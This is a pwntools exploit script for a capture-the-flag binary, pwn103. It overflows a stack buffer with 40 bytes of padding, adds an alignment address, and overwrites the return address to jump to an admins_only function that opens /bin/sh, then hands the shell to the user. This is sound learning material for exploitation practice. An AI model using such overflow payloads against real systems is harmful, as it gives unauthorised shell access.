from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn103.pwn103'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# Print out the target address
info("%#x target", elf.symbols.admins_only)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = b"A"*40

banner = p64(elf.symbols.banner) #stack alignment apparantly
admins_func = p64(elf.symbols.admins_only) #address of admins_only which has /bin/sh

payload = flat(
    padding + banner + admins_func 
)

print(payload)
# Save the payload to file
write('payload1', payload)

#recieve menu
for _ in range(20):
    io.recvline()

# Send the payload
io.sendline(b'3')
print(io.recvline())
for _ in range(7):
    io.recvline()
io.sendlineafter(b': ',payload)
# Receive the flag
io.interactive()
